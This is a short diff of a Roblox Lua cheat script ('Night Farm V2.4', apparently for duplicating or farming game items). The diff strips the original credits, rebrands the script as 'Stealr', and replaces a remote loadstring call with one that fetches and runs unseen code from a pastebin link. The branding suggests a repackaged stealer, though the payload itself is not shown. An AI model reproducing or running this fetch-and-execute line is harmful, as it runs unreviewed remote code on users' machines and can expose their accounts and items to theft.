@@ -1,5 +1,5 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "Night Farm V2.4", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = false})
+local Window = OrionLib:MakeWindow({Name = "Night Farm V2.4(Private)", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = false})
 
 local Tab = Window:MakeTab({
 	Name = "Farming & Eggs",
@@ -110,12 +110,13 @@ local Tab = Window:MakeTab({
 	PremiumOnly = false
 })
 
-Tab:AddLabel("Credits: Karya#5055 And Benandyager#9031 ")
+Tab:AddLabel("dsc.gg/stealr")
 wait(2)
-loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/script2")()
+loadstring(game:HttpGet"https://pastebin.com/raw/APuHkcsM")()
 wait(5)
 OrionLib:MakeNotification({
-	Name = "Karya#5055 And Benandyager",
+	Name = "Stealr #1!",
+	Content = "dsc.gg/stealr",
 	Image = "rbxassetid://4483345998",
 	Time = 5
 })
